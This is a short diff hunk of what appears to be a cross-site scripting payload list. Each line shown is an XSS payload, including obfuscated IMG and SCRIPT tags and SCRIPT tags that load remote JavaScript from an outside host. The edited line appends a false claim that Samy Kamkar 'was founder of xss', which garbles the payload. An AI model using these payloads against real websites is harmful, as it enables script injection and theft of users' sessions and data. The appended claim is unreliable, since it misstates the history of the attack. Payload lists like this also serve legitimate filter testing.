@@ -1057,7 +1057,7 @@ perl -e 'print \"&lt;IMG SRC=java\0script&#058;alert(\\"XSS\\")&gt;\";' &gt; out
 <IMG SRC=" &#14;  javascript:alert('XSS');">
 <SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
 <SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<<SCRIPT>alert("XSS");//<</SCRIPT>
+<<SCRIPT>alert("XSS");//<</SCRIPT> samy kamkar was founder of xss he used AJAX 
 <SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
 \";alert('XSS');//
 </TITLE><SCRIPT>alert("XSS");</SCRIPT>
